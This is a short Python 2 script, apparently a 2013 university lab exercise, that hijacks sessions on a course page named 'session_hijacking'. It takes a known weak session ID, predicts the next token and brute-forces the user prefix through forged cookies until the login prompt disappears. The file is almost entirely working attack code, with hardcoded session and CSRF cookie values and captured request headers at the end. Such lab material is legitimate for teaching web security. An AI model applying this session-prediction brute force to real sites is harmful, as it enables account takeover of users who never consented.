#/usr/bin/python2.7
# Date : Fevrier 2013
# Author : Healey Adrian
# Noma : 2281-07-00

import urllib2
import sys

class IdGenerator:


    def __init__(self,weakid='42056ddcb61cb114'):
        # Decomposition du weakid fourni.
        self.randomPart = weakid[2:-2]
        token = weakid[-2:]
        
        # Incrementation du token
        self.nextToken = (int(token)+1)%100
        if self.nextToken < 10:
            self.nextToken = '0' + str(self.nextToken)
        else:
            self.nextToken = str(self.nextToken)
    
        self.csrftoken = 'csrftoken=d1d9d24bab7860cfba2f8e0afc7733db'
        self.sessionid = 'sessionid=e34a0b31658bd6a1aaa6583d0aede669'
        
        # Creation de la requete
        req = urllib2.Request('http://matta.info.ucl.ac.be/session_hijacking/')
        req.add_header('Host','matta.info.ucl.ac.be')
        
        print '[*] Testing for WeakId: **' + self.randomPart + self.nextToken + '.'
        
        for n in range(100):
            # Generation du prochain weakid a tester
            weakid = self.getWeakid(n)
            # Creation de l'entete necessaire
            req.add_header('Cookie','weakadvsessionid=' + weakid + '; ' + self.csrftoken + '; ' + self.sessionid)
            page = urllib2.urlopen(req).read()
            if page.find('Please log in') == -1:            
                print '[+] Valid WeakId found: ' + weakid +'.'
                break
            
            if n==99:
                print '[-] WeakId not found.'
                
    # Genere le string representant le weakid a tester
    def getWeakid(self,user):
        if user < 10:
            userid = '0' + str(user)
        else:
            userid = str(user)
            
        return userid + self.randomPart + self.nextToken
    
        
if __name__ == '__main__':
    if len(sys.argv)>1:
        IdGenerator(sys.argv[1])
    else:
        print 'use: python ' + sys.argv[0] + ' valid-WeakId'
    
    
'''
Host: matta.info.ucl.ac.be
Cookie: weakadvsessionid=42056ddcb61cb114; csrftoken=acd30b47ac747b8777247c939e8fb5d6; sessionid=480b4e7ba7ae0e15cc43790b5a00e5f9
Thu Feb 21 13:08:55 CET 2013	115cf375b8668068	18	1
